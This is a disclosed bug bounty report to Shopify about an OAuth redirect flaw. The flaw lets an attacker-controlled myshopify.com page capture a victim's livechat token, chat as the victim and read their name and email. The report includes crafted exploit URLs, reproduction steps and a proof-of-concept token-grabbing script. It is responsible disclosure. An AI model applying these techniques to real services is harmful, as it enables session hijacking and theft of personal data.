# Stealing livechat token and using it to chat as the user - user information disclosure 

## Report Details
- **Report ID**: 151058
- **URL**: https://hackerone.com/reports/151058
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-13T06:15:51.924Z
- **Disclosed**: 2016-07-19T00:53:07.236Z

## Reporter
- **Username**: zombiehelp54
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi , I have found an issue through which an attacker can steal users' livechat access token and use it to login and chat with the support agents as them , he also will be able to get access to sensitive user information such as his email and his first name and last name.
#Details: 
When you go to https://support.shopify.com/ , if you click the **Open Chat** button at the bottom of the page, you'll be asked to authenticate using your shop. 
When you click the **authenticate** button , you'll go to this link: 
```
https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https%3A%2F%2Flivechat.shopify.com%2Fcustomer%2Fchats%2Fnew&shop=<shop>.myshopify.com
```
The problem is that you have configured your oauth redirect_uri (the `return_to` parameter ) to accept any link like this: 
- <anything>.shopify.com/
- <anything>.myshopify.com/

Which means that an attacker can set the redirect URI to something like: 
```
https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://<attacker_shop>.myshopify.com/&shop=<victim_shop>.myshopify.com
```
And send the link to the victim and when his victim opens it , he will be redirected to `https://<attacker_shop>.myshopify.com/?auth_code=<access_token>` and since the attacker has full control over the HTML and JavaScript of `<attacker_shop>.myshopify.com` , he can use JavaScript to fetch the returned access token and save it anywhere. 

Then the attacker can use that access token to login as the user's shop in livechat.shopify.com by going to 
`https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat` 
After that the attacker can know the first name and the email of the victim by checking the page source code.
They will be stored as: 
```javascript
var chat = new TC.CustomerChat({
      chat: {"id":"<id>","token":"<chat_token>","name":"<user_first_and_last_name>","email":"<user_email>","metadata": "<other_meta_data>"},
      host: "livechat.shopify.com",
      role: "customer",
      eventChannel: eventChannel,
      pusher: new Pusher("c7e0a5a73ab848bea519")
    });
```
#Steps to reproduce:
1. Go to: ` https://tasker-merchant-auth.herokuapp.com/auth/shopify/?utf8=%E2%9C%93&auth_type=chat&return_to=https://zh5401.myshopify.com/&shop=<your_shop>.myshopify.com `
2. If you haven't authorized Shopify support before , you'll be asked to grant access and if you have already done that before , you'll be automatically redirected to `https://zh5401.myshopify.com/?auth_code=<access_token>&auth_type=chat` 
3. You'll see your access token in an alert box and it will be written to the DOM , copy that access token and open a new browser then go to  `https://livechat.shopify.com/customer/chats/new?auth_code=<access_token>&auth_type=chat`  
4. You'll be able to login to livechat , to see your email and name , view the page source then look for `TC.CustomerChat` 

Code used in `https://zh5401.myshopify.com` to fetch the `auth_code`: 
```html
<script>
 var token = window.location.search.match(/auth_code=([^&]+)/);
      if (token && token.length > 1) {
        alert("Your access token is: " + token[1]);
        document.write("Attacker can use it to chat with support agents as you and he will be able to get your email <br> <b>Go to https://livechat.shopify.com/customer/chats/new?auth_type=chat&auth_code=" + token[1]);
      }

</script>
```

#Impact:
There are two impacts here , one is chatting with support agents as another user which may lead to a lot of problems. The other is getting sensitive information about the user such as his email and full name. 

Thanks! 


## Attachments
No attachments
